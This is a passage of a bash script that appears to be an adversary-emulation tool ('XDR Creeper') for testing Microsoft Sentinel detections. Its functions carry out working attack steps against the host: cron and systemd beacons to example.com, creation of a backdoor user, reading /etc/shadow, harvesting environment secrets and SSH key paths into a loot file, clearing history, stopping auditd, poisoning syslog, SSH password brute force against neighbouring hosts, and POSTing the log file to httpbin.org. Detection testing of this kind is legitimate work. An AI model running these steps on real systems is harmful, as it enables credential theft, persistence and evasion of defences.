    phase_header 7 $TOTAL_ATTACKS "CRON JOB PERSISTENCE" "T1053.003 Scheduled Task/Job: Cron"
    xdr "Scheduled Task (T1053.003)"
    
    hack "Planting cron persistence..."
    echo "*/5 * * * * curl -s http://example.com/beacon > /dev/null # XDR_CREEPER_TEST" | \
        crontab - 2>/dev/null || true
    result "Cron job installed: beacon every 5 minutes"
    csv_log "PERSISTENCE" "cron_job" "beacon every 5min" "OK"
    
    crontab -l 2>/dev/null | while read line; do echo -e "  ${R}  ⚡ ${line}${N}"; done
    
    sleep 3
    hack "Cleanup: removing cron persistence..."
    crontab -r 2>/dev/null || true
    ok "Cron job removed"
    csv_log "PERSISTENCE" "cron_cleanup" "removed" "OK"
}

attack_08_systemd() {
    phase_header 8 $TOTAL_ATTACKS "SYSTEMD SERVICE PERSISTENCE" "T1543.002 Systemd Service"
    xdr "New systemd service created — persistence mechanism"
    
    hack "Creating malicious systemd service unit..."
    cat > /tmp/.xdr_beacon.service << 'UNIT'
[Unit]
Description=XDR Creeper — Persistence Beacon (TEST)
After=network.target
[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do curl -s http://example.com/beacon > /dev/null 2>&1; sleep 300; done'
Restart=always
[Install]
WantedBy=multi-user.target
UNIT
    
    hack "Installing service..."
    cp /tmp/.xdr_beacon.service /etc/systemd/system/xdr-beacon.service 2>/dev/null || true
    systemctl daemon-reload 2>/dev/null || true
    result "Service installed: /etc/systemd/system/xdr-beacon.service"
    warn "Service NOT started — detection test only"
    csv_log "PERSISTENCE" "systemd_install" "xdr-beacon.service" "OK"
    
    sleep 5
    hack "Cleanup: removing beacon service..."
    rm -f /etc/systemd/system/xdr-beacon.service /tmp/.xdr_beacon.service
    systemctl daemon-reload 2>/dev/null || true
    ok "Service removed"
    csv_log "PERSISTENCE" "systemd_cleanup" "removed" "OK"
}

attack_09_backdoor_user() {
    phase_header 9 $TOTAL_ATTACKS "BACKDOOR USER CREATION" "T1136.001 Create Account: Local Account"
    xdr "Local Account Creation (T1136.001)"
    
    hack "Creating backdoor user account..."
    useradd -M -s /bin/bash -c "XDR Test Account" xdr_backdoor 2>/dev/null || true
    echo -e "  ${R}  ⚠ NEW USER:${N}"
    grep xdr_backdoor /etc/passwd 2>/dev/null | while read line; do echo -e "  ${R}    $line${N}"; done
    csv_log "PERSISTENCE" "create_user" "xdr_backdoor" "OK"
    
    sleep 3
    hack "Cleanup: removing backdoor user..."
    userdel xdr_backdoor 2>/dev/null || true
    ok "Backdoor user removed"
    csv_log "PERSISTENCE" "cleanup_user" "removed" "OK"
}

attack_10_shadow() {
    phase_header 10 $TOTAL_ATTACKS "SHADOW FILE CREDENTIAL ACCESS" "T1003 OS Credential Dumping"
    xdr "Credential Access (T1003) — shadow file read"
    
    hack "Attempting to read /etc/shadow — HIGH SEVERITY"
    if cat /etc/shadow >> "$LOOT" 2>/dev/null; then
        result "/etc/shadow READABLE — hashes extracted"
        csv_log "CRED_ACCESS" "shadow_read" "readable" "CRITICAL"
    else
        info "Permission denied"
        csv_log "CRED_ACCESS" "shadow_read" "denied" "BLOCKED"
    fi
    
    hack "Searching for secrets in environment..."
    local secrets
    secrets=$(env | grep -icE 'key|secret|token|pass|api|cred' 2>/dev/null || echo "0")
    result "Found ${secrets} potential secret variables"
    env | grep -iE 'key|secret|token|pass|api|cred' >> "$LOOT" 2>/dev/null || true
    csv_log "CRED_ACCESS" "env_secrets" "$secrets found" "OK"
}

attack_11_ssh_keys() {
    phase_header 11 $TOTAL_ATTACKS "SSH KEY HARVESTING" "T1552.004 Unsecured Credentials: Private Keys"
    xdr "SSH Key Discovery (T1552.004)"
    
    hack "Harvesting SSH private keys..."
    echo -e "  ${W}  SSH KEYS FOUND:${N}"
    local key_count=0
    for user_home in /home/* /root; do
        if [[ -d "${user_home}/.ssh" ]]; then
            for keyfile in "${user_home}/.ssh/id_"*; do
                if [[ -f "$keyfile" ]] && [[ ! "$keyfile" == *.pub ]]; then
                    echo -e "  ${R}  ⚠ PRIVATE KEY: ${keyfile}${N}"
                    echo "PRIVATE_KEY: ${keyfile}" >> "$LOOT"
                    key_count=$((key_count + 1))
                fi
            done
        fi
    done
    [[ $key_count -eq 0 ]] && info "No private keys found"
    result "SSH key scan: ${key_count} private keys"
    csv_log "CRED_ACCESS" "ssh_keys" "${key_count} keys" "OK"
}

attack_12_payload() {
    phase_header 12 $TOTAL_ATTACKS "PAYLOAD DOWNLOAD SIMULATION" "T1105 Ingress Tool Transfer"
    xdr "Suspicious File Download"
    
    hack "Downloading suspicious payload via curl..."
    curl -s -o /tmp/.xdr_payload.dat --max-time 10 \
        "https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/README.md" 2>/dev/null || true
    result "Payload saved to /tmp/.xdr_payload.dat"
    csv_log "DELIVERY" "payload_download" "/tmp/.xdr_payload.dat" "OK"
    
    hack "Secondary download via wget..."
    wget -q --max-redirect=0 -O /tmp/.xdr_dropper.sh "https://example.com" 2>/dev/null || true
    csv_log "DELIVERY" "dropper" "attempt" "OK"
    
    sleep 2
    hack "Cleanup..."
    rm -f /tmp/.xdr_payload.dat /tmp/.xdr_dropper.sh
    ok "Payload files removed"
    csv_log "DELIVERY" "cleanup" "removed" "OK"
}

attack_13_history() {
    phase_header 13 $TOTAL_ATTACKS "BASH HISTORY CLEARING" "T1070.003 Clear Command History"
    xdr "Anti-Forensics (T1070.003)"
    
    hack "Clearing bash history..."
    history -c 2>/dev/null || true
    cat /dev/null > ~/.bash_history 2>/dev/null || true
    ok "History cleared"
    csv_log "EVASION" "clear_history" "wiped" "OK"
    
    hack "Timestomping test file..."
    touch -t 202001011200 /tmp/.xdr_ts_test 2>/dev/null || true
    info "Modified timestamp to 2020-01-01"
    rm -f /tmp/.xdr_ts_test
    csv_log "EVASION" "timestomp" "done" "OK"
}

attack_14_audit_stop() {
    phase_header 14 $TOTAL_ATTACKS "AUDITD / RSYSLOG DISRUPTION" "T1562 Impair Defenses"
    xdr "Defense Evasion — audit service stopped"
    
    hack "Stopping auditd service..."
    systemctl stop auditd 2>/dev/null && ok "auditd STOPPED" || info "auditd not running"
    csv_log "EVASION" "stop_auditd" "stopped" "OK"
    
    sleep 3
    hack "Restarting auditd (cleanup)..."
    systemctl start auditd 2>/dev/null || true
    ok "auditd restarted"
    csv_log "EVASION" "restart_auditd" "restored" "OK"
}

attack_15_log_truncation() {
    phase_header 15 $TOTAL_ATTACKS "LOG FILE TRUNCATION" "T1070.002 Clear Linux Logs"
    xdr "Log Tampering (T1070.002)"
    
    hack "Touching auth.log..."
    touch /var/log/auth.log 2>/dev/null || true
    logger -t "xdr-creeper" "LOG TAMPERING: attempted truncation of /var/log/auth.log"
    result "auth.log touch + syslog entry generated"
    csv_log "EVASION" "log_tamper" "auth.log" "SIMULATED"
    
    hack "Injecting fake syslog entries..."
    local fake_entries=(
        "sshd[99999]: Accepted password for admin from 203.0.113.99 port 31337"
        "kernel: [UFW BLOCK] IN=eth0 SRC=10.10.10.10 DST=10.10.1.4 PROTO=TCP DPT=4444"
        "CRON[88888]: (root) CMD (/tmp/.hidden_miner --donate-level=100)"
        "systemd[1]: Started Cryptocurrency Mining Service"
    )
    for entry in "${fake_entries[@]}"; do
        logger -t "xdr-creeper-poison" "$entry"
        echo -e "  ${R}  ⚡ INJECTED: ${entry}${N}"
        csv_log "EVASION" "log_poison" "$entry" "OK"
        sleep 0.3
    done
    result "Fake log entries injected"
}

attack_16_firewall() {
    phase_header 16 $TOTAL_ATTACKS "FIREWALL RULE MODIFICATION" "T1562.004 Disable Firewall"
    xdr "Firewall Modification (T1562.004)"
    
    run "Checking firewall state..."
    command -v ufw &>/dev/null && ufw status 2>/dev/null | head -5 | while read line; do echo -e "  ${D}  $line${N}"; done
    command -v iptables &>/dev/null && echo -e "  ${D}  iptables rules: $(iptables -L 2>/dev/null | grep -c 'Chain')${N}"
    
    warn "NOT flushing firewall (safety) — logging attempt only"
    logger -t "xdr-creeper" "FIREWALL: attempted flush"
    csv_log "EVASION" "firewall" "attempt logged" "SIMULATED"
}

attack_17_shares() {
    phase_header 17 $TOTAL_ATTACKS "NETWORK SHARE SCANNING" "T1135 Network Share Discovery"
    xdr "Network Share Discovery (T1135)"
    
    run "Checking NFS exports..."
    if command -v showmount &>/dev/null; then
        showmount -e "$(hostname -I 2>/dev/null | awk '{print $1}')" 2>/dev/null | \
            while read line; do echo -e "  ${Y}  ⚠ NFS: $line${N}"; done
    else
        info "showmount not available"
    fi
    csv_log "RECON" "nfs_scan" "checked" "OK"
    
    run "Checking SMB shares..."
    if command -v smbclient &>/dev/null; then
        smbclient -L localhost -N 2>/dev/null | head -15 | while read line; do echo -e "  ${D}  $line${N}"; done
    else
        info "smbclient not available"
    fi
    csv_log "RECON" "smb_scan" "checked" "OK"
}

attack_18_ssh_brute() {
    phase_header 18 $TOTAL_ATTACKS "SSH BRUTE FORCE SIMULATION" "T1110.001 Password Guessing"
    xdr "SSH Brute Force (T1110.001)"
    
    local my_ip
    my_ip=$(hostname -I 2>/dev/null | awk '{print $1}')
    local base
    base=$(echo "$my_ip" | sed 's/\.[0-9]*$//')
    local passwords=("admin" "password" "P@ssw0rd" "root123" "xdradmin" "Welcome1" "123456" "letmein")
    
    hack "Simulating SSH brute force..."
    for octet in 4 5 6; do
        local target="${base}.${octet}"
        [[ "$target" == "$my_ip" ]] && continue
        echo -e "  ${W}  Target: ${target}:22${N}"
        for pw in "${passwords[@]}"; do
            if command -v sshpass &>/dev/null; then
                sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
                    "${SSH_USER}@${target}" "echo ok" 2>/dev/null && break || true
            fi
            printf "  ${R}  ✘${N} ${target} → user=${SSH_USER} pass=%-14s ${D}DENIED${N}\n" "$pw"
            sleep 0.2
        done
        csv_log "LATERAL" "brute_force" "$target" "BLOCKED"
        echo ""
    done
}

attack_19_dns() {
    phase_header 19 $TOTAL_ATTACKS "DNS ENUMERATION" "T1596 Search Open Technical Databases"
    xdr "DNS enumeration, WHOIS lookups"
    
    local targets=("microsoft.com")
    for domain in "${targets[@]}"; do
        run "DNS lookup: ${domain}"
        echo -e "  ${W}  ┌── DNS: ${domain} ────────────────────────────────────┐${N}"
        echo -e "  ${W}  │${N} A      : $(dig +short "$domain" 2>/dev/null | head -3 | tr '\n' ', ')"
        echo -e "  ${W}  │${N} MX     : $(dig MX +short "$domain" 2>/dev/null | head -2 | tr '\n' ', ')"
        echo -e "  ${W}  │${N} NS     : $(dig NS +short "$domain" 2>/dev/null | head -2 | tr '\n' ', ')"
        echo -e "  ${W}  │${N} TXT    : $(dig TXT +short "$domain" 2>/dev/null | head -1)"
        echo -e "  ${W}  └──────────────────────────────────────────────────────────┘${N}"
        csv_log "DNS_RECON" "dns_lookup" "$domain" "OK"
    done
    
    hack "Revealing public IP..."
    local pub_ip
    pub_ip=$(curl -s --max-time 5 https://ifconfig.me 2>/dev/null || echo "FAILED")
    result "Public IP: ${pub_ip}"
    echo "$pub_ip" >> "$LOOT"
    csv_log "DNS_RECON" "public_ip" "$pub_ip" "OK"
}

attack_20_c2_exfil() {
    phase_header 20 $TOTAL_ATTACKS "C2 BEACONING & DATA EXFILTRATION" "T1071 App Layer Protocol / T1041 Exfil Over C2"
    xdr "Beaconing + data exfiltration"
    
    run "Beacon loop (${BEACON_ROUNDS} rounds, every ${BEACON_INTERVAL}s)..."
    hack "Simulating C2 check-in traffic"
    echo ""
    for round in $(seq 1 $BEACON_ROUNDS); do
        for domain in "${C2_TARGETS[@]}"; do
            local code
            code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "http://${domain}" 2>/dev/null || echo "ERR")
            printf "  ${R}  [%s]${N} BEACON #%02d → %-20s ${D}HTTP %s${N}\n" "$(date '+%H:%M:%S')" "$round" "$domain" "$code"
            csv_log "C2_BEACON" "beacon" "$domain ($code)" "OK"
        done
        [[ $round -lt $BEACON_ROUNDS ]] && sleep "$BEACON_INTERVAL"
    done
    result "Total beacons: $((BEACON_ROUNDS * ${#C2_TARGETS[@]}))"
    
    echo ""
    hack "Simulating exfiltration (curl POST)..."
    xdr "Data Exfiltration Over C2 Channel"
    curl -s -X POST -d @"$CSV" "https://httpbin.org/post" > /dev/null 2>&1 || true
    result "Exfil attempt to httpbin.org (simulated)"
    csv_log "EXFIL" "exfil_attempt" "CSV posted" "SIMULATED"
}

# ═══════════════════════════════════════════════════════════════════════════════
# MISSION REPORT
# ═══════════════════════════════════════════════════════════════════════════════
mission_report() {
    echo ""
    echo -e "${BG_G}${W}                                                                              ${N}"
    echo -e "${BG_G}${W}  ◆ XDR CREEPER — MISSION COMPLETE                                           ${N}"
    echo -e "${BG_G}${W}                                                                              ${N}"
    echo ""
    echo -e "  ${W}  ┌── LOOT SUMMARY ──────────────────────────────────────────┐${N}"
    echo -e "  ${W}  │${N} Recon    : ${RECON} ($(wc -l < "$RECON" 2>/dev/null || echo 0) lines)"
    echo -e "  ${W}  │${N} Loot     : ${LOOT} ($(wc -l < "$LOOT" 2>/dev/null || echo 0) lines)"
    echo -e "  ${W}  │${N} Timeline : ${CSV} ($(wc -l < "$CSV" 2>/dev/null || echo 0) entries)"
    echo -e "  ${W}  │${N} Log dir  : ${LOG_DIR}/"
    echo -e "  ${W}  └──────────────────────────────────────────────────────────┘${N}"
    echo ""
    echo -e "  ${W}  ┌── MITRE ATT&CK COVERAGE ───────────────────────────────────┐${N}"
    local -a mitre_list=(
        "T1588  Obtain Capabilities"
        "T1082  System Information Discovery"
        "T1087  Account Discovery"
        "T1046  Network Service Scanning"
        "T1053  Scheduled Task/Job (Cron)"
        "T1543  Create/Modify System Process"
        "T1136  Create Account"
        "T1003  OS Credential Dumping"
        "T1552  Unsecured Credentials"
        "T1105  Ingress Tool Transfer"
        "T1070  Indicator Removal"
        "T1562  Impair Defenses"
        "T1135  Network Share Discovery"
        "T1110  Brute Force"
        "T1596  Search Open Technical Databases"
        "T1071  Application Layer Protocol"
        "T1041  Exfiltration Over C2"
    )
    for m in "${mitre_list[@]}"; do echo -e "  ${W}  │${N} ${m}"; done
    echo -e "  ${W}  └──────────────────────────────────────────────────────────────┘${N}"
    echo ""
    echo -e "  ${Y}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
    echo -e "  ${Y}  WHAT TO CHECK NOW:${N}"
    echo -e "  ${W}  1.${N} ${C}security.microsoft.com${N} → Incidents & Alerts"
    echo -e "  ${W}  2.${N} ${C}portal.azure.com${N} → Microsoft Sentinel → Incidents"
    echo -e "  ${W}  3.${N} ${C}Sentinel → Analytics${N} → verify custom rules"
    echo -e "  ${W}  4.${N} ${C}Sentinel → Logs${N} → KQL queries"
    echo -e "  ${W}  5.${N} Review: ${C}${CSV}${N}"
    echo -e "  ${W}  6.${N} Findings: ${C}${FINDINGS_FILE}${N}  ${D}(for DLC-12 Auditor)${N}"
    echo -e "  ${Y}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
    echo ""
    echo -e "  ${D}  Alerts: 5-15 min. Full Sentinel correlation: up to 30 min.${N}"
    echo ""
    echo -e "                              ${W}${BOLD}— X D R   C R E E P E R —${N}"
    echo ""
    csv_log "COMPLETE" "finish" "Mission complete" "OK"
}

# ═══════════════════════════════════════════════════════════════════════════════
# DLC LOADER
# ═══════════════════════════════════════════════════════════════════════════════
load_dlc() {
    local dlc_name="$1"
    local dlc_file="${DLC_DIR}/dlc-${dlc_name}.sh"
    if [[ ! -f "$dlc_file" ]]; then
        fail "DLC not found: ${dlc_file}"
        ls "${DLC_DIR}"/dlc-*.sh 2>/dev/null | while read f; do
            echo -e "  ${D}    $(basename "$f" .sh | sed 's/dlc-//')${N}"
        done
        return 1
    fi
    local color_key="${dlc_name%%-*}"
    MODULE_COLOR="${DLC_COLORS[$color_key]:-$G_BRIGHT}"
    CURRENT_MODULE="DLC-${dlc_name^^}"
    source "$dlc_file"
    if declare -f dlc_main &>/dev/null; then
        dlc_main
    else
        fail "DLC has no dlc_main() function"
        return 1
    fi
}

list_dlcs() {
    echo ""
    echo -e "  ${W}${BOLD}Available DLC Modules:${N}"
    echo -e "  ${D}══════════════════════════════════════════════════════════════${N}"
    local -a dlcs=(
        "01-iam-abuse|01|IAM Abuse|TA0001,TA0003|Account manipulation, token theft"
        "02-privesc|02|Privilege Escalation|TA0004|SUID abuse, sudo misconfig"
        "03-credential-harvest|03|Credential Harvesting|TA0006|IMDS, secrets, keyrings"
        "04-lateral-movement|04|Lateral Movement|TA0008|SSH pivot, spray, tunnels"
        "05-persistence|05|Persistence|TA0003|Cron, systemd, udev, APT hooks"
        "06-defense-evasion|06|Defense Evasion|TA0005|Masquerading, timestomping, log surgery"
        "07-exfiltration|07|Exfiltration|TA0010|DNS exfil, HTTPS, ICMP, covert"
        "08-c2-simulation|08|C2 Simulation|TA0011|Beaconing, DNS C2, domain fronting"
        "09-ad-attacks|09|AD/Directory Attacks|TA0006,TA0007|LDAP, Kerberos, DCSync"
        "10-cloud-azure|10|Cloud & Azure|TA0001,TA0009|IMDS, managed identity, Key Vault"
        "11-impact-destruction|11|Impact & Destruction|TA0040|Ransomware sim, wiper, DoS"
        "12-auditor|12|Auditor — Security Report|N/A|Aggregates findings, scoring, HTML report"
    )
    local idx=1
    for info in "${dlcs[@]}"; do
        IFS='|' read -r id ckey name mitre desc <<< "$info"
        local status="${R}NOT INSTALLED${N}"
        [[ -f "${DLC_DIR}/dlc-${id}.sh" ]] && status="${G}INSTALLED${N}"
        local accent="${DLC_COLORS[$ckey]:-$AU_BASE}"
        printf "  ${G_BRIGHT}%2d${N})  ${accent}%-22s${N}  ${D}%-16s${N} | ${status}\n" "$idx" "$name" "($mitre)"
        echo -e "  ${D}      ${desc}${N}"
        idx=$((idx + 1))
    done
    echo ""
    echo -e "  ${D}──────────────────────────────────────────────────────────────${N}"
    echo -e "  ${G_BRIGHT} 0${N})  ${W}← Back to main menu${N}"
    echo ""
}

# DLC name lookup by number
dlc_id_by_number() {
    local -a dlc_ids=("01-iam-abuse" "02-privesc" "03-credential-harvest" "04-lateral-movement"
        "05-persistence" "06-defense-evasion" "07-exfiltration" "08-c2-simulation"
        "09-ad-attacks" "10-cloud-azure" "11-impact-destruction" "12-auditor")
    local num=$1
    if [[ $num -ge 1 && $num -le ${#dlc_ids[@]} ]]; then
        echo "${dlc_ids[$((num-1))]}"
    else
        echo ""
    fi
}

# ═══════════════════════════════════════════════════════════════════════════════
# INTERACTIVE MENU
# ═══════════════════════════════════════════════════════════════════════════════
interactive_menu() {
    while true; do
        clear
        # Bug + XDR CREEPER logo
        printf '%b\n' "${G_BRIGHT}${CREEPER_BUG}${N}"
        printf '%b\n' "${G_BRIGHT}${CREEPER_TEXT}${N}"
        echo ""
        echo -e "  ${D}  Author : Daniel Budyn | newlife.org.pl@gmail.com |  NEWLIFE${N}"
        echo -e "  ${D}  Version: ${VERSION}${N}"
        echo ""
        echo -e "  ${BG_G}${W}                                                                              ${N}"
        echo -e "  ${BG_G}${W}  ⚠  SAFETY: This tool reverts all changes automatically.                    ${N}"
        echo -e "  ${BG_G}${W}     Do NOT interrupt or disable this script during execution.                ${N}"
        echo -e "  ${BG_G}${W}     It is designed to restore factory settings after each test.              ${N}"
        echo -e "  ${BG_G}${W}                                                                              ${N}"
        echo ""
        echo -e "  ${W}${BOLD}XDR CREEPER — INTERACTIVE MENU${N}"
        echo -e "  ${D}══════════════════════════════════════════════════════════════${N}"
        echo ""
        echo -e "  ${G_BRIGHT}1${N})  ${W}Run ALL 20 core attacks${N}"
        echo -e "  ${G_BRIGHT}2${N})  ${W}Select individual attacks${N}"
        echo -e "  ${G_BRIGHT}3${N})  ${W}Load DLC module (numbered list)${N}"
        echo -e "  ${G_BRIGHT}4${N})  ${W}List available DLCs${N}"
        echo -e "  ${G_BRIGHT}5${N})  ${W}Full assault + all DLCs${N}"
        echo ""
        echo -e "  ${G_BRIGHT}0${N})  ${D}Exit${N}"
        echo ""
        echo -e "  ${D}──────────────────────────────────────────────────────────────${N}"
        read -rp "$(echo -e "  ${G_LIGHT}Select > ${N}")" choice
        case "$choice" in
            1) run_all_core; echo ""; read -rp "$(echo -e "  ${D}Press ENTER to return to menu...${N}")" ;;
            2) select_attacks; echo ""; read -rp "$(echo -e "  ${D}Press ENTER to return to menu...${N}")" ;;
            3) dlc_select_menu ;;
            4) list_dlcs; read -rp "$(echo -e "  ${D}Press ENTER to return to menu...${N}")" ;;
            5) run_all_core
               for f in "${DLC_DIR}"/dlc-*.sh; do
                   [[ -f "$f" ]] && load_dlc "$(basename "$f" .sh | sed 's/dlc-//')"
               done
               echo ""; read -rp "$(echo -e "  ${D}Press ENTER to return to menu...${N}")" ;;
            0|q|Q) echo -e "  ${G}Goodbye.${N}"; return 0 ;;
            *) echo -e "  ${Y}Unknown option. Try 1-5 or 0 to exit.${N}"; sleep 1 ;;
        esac
    done
}

# DLC selection submenu with numbered choices
dlc_select_menu() {
    while true; do
        echo ""
        list_dlcs
        read -rp "$(echo -e "  ${G_LIGHT}Select DLC (1-12) or 0 to go back > ${N}")" dlc_choice
        case "$dlc_choice" in
            0|"") return ;;
            [1-9]|1[0-2])
                local dlc_id; dlc_id=$(dlc_id_by_number "$dlc_choice")
                if [[ -n "$dlc_id" ]]; then
                    load_dlc "$dlc_id"
                    echo ""; read -rp "$(echo -e "  ${D}Press ENTER to return to DLC list...${N}")"
                else
                    echo -e "  ${Y}Invalid DLC number.${N}"; sleep 1
                fi
                ;;
            *) echo -e "  ${Y}Enter a number 1-12 or 0 to go back.${N}"; sleep 1 ;;
        esac
    done
}

select_attacks() {
    echo ""
    echo -e "  ${W}Select attacks (comma-separated, ranges ok, e.g. 1,3,5,10-15):${N}"
    echo -e "  ${D}  01) Preflight       11) SSH key harvest${N}"
    echo -e "  ${D}  02) Arsenal setup    12) Payload download${N}"
    echo -e "  ${D}  03) Fingerprint      13) History clearing${N}"
    echo -e "  ${D}  04) User enum        14) Auditd disruption${N}"
    echo -e "  ${D}  05) Network scan     15) Log truncation${N}"
    echo -e "  ${D}  06) Service enum     16) Firewall mod${N}"
    echo -e "  ${D}  07) Cron persist     17) Share scanning${N}"
    echo -e "  ${D}  08) Systemd persist  18) SSH brute force${N}"
    echo -e "  ${D}  09) Backdoor user    19) DNS enumeration${N}"
    echo -e "  ${D}  10) Shadow access    20) C2 + exfil${N}"
    echo ""
    read -rp "$(echo -e "  ${G_LIGHT}Attacks > ${N}")" selection
    local attacks=()
    IFS=',' read -ra parts <<< "$selection"
    for part in "${parts[@]}"; do
        part=$(echo "$part" | tr -d ' ')
        if [[ "$part" == *-* ]]; then
            local s e; s=$(echo "$part" | cut -d'-' -f1); e=$(echo "$part" | cut -d'-' -f2)
            for ((n=s; n<=e; n++)); do attacks+=($n); done
        else
            attacks+=("$part")
        fi
    done
    for atk in "${attacks[@]}"; do run_attack "$atk"; done
    mission_report
}

run_attack() {
    case "$1" in
        1)  attack_01_preflight ;;     2)  attack_02_tooling ;;
        3)  attack_03_fingerprint ;;   4)  attack_04_users ;;
        5)  attack_05_network ;;       6)  attack_06_services ;;
        7)  attack_07_cron ;;          8)  attack_08_systemd ;;
        9)  attack_09_backdoor_user ;; 10) attack_10_shadow ;;
        11) attack_11_ssh_keys ;;      12) attack_12_payload ;;
        13) attack_13_history ;;       14) attack_14_audit_stop ;;
        15) attack_15_log_truncation ;;16) attack_16_firewall ;;
        17) attack_17_shares ;;        18) attack_18_ssh_brute ;;
        19) attack_19_dns ;;           20) attack_20_c2_exfil ;;
        *)  warn "Unknown attack: $1" ;;
    esac
}

run_all_core() {
    for i in $(seq 1 $TOTAL_ATTACKS); do run_attack $i; done
    mission_report
}

# ═══════════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════════
main() {
    local no_animate=false
    local mode="menu"
    local dlc_name=""
    
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --subnet) SUBNET="$2"; shift 2 ;;
            --all) mode="all"; shift ;;
            --dlc) mode="dlc"; dlc_name="$2"; shift 2 ;;
            --list-dlc) mode="list"; shift ;;
            --menu) mode="menu"; shift ;;
            --no-animate) no_animate=true; shift ;;
            *) echo "Unknown option: $1"; exit 1 ;;
        esac
    done
    
    detect_subnet
    
    if [[ "$no_animate" == "false" ]]; then
        animated_intro "CORE LINUX — 20 Attack Techniques" "$G_BRIGHT"
    fi
    
    init
    
    case "$mode" in
        all)
            module_splash "CORE LINUX" \
                "20 built-in attacks covering the full MITRE kill chain" \
                "T1588 T1082 T1087 T1046 T1053 T1543 T1136 T1003 T1552 T1105 T1070 T1562 T1135 T1110 T1596 T1071 T1041" \
                "$(printf '%s\n' \
                    "Preflight & Environment Profiling" \
                    "Arsenal Setup — Tool Installation" \
                    "System Fingerprinting" \
                    "User & Group Enumeration" \
                    "Network Discovery (ARP + Nmap)" \
                    "Service & Port Enumeration" \
                    "Cron Job Persistence" \
                    "Systemd Service Persistence" \
                    "Backdoor User Creation" \
                    "Shadow File Credential Access" \
                    "SSH Key Harvesting" \
                    "Payload Download Simulation" \
                    "Bash History Clearing" \
                    "Auditd / Rsyslog Disruption" \
                    "Log Truncation & Poisoning" \
                    "Firewall Rule Modification" \
                    "Network Share Scanning" \
                    "SSH Brute Force Simulation" \
                    "DNS Enumeration & OSINT" \
                    "C2 Beaconing & Exfiltration")" \
                "HIGH" "$G_BRIGHT"
            run_all_core
            ;;
        dlc)  load_dlc "$dlc_name" ;;
        list) list_dlcs ;;
        menu) interactive_menu ;;
    esac
}

main "$@"
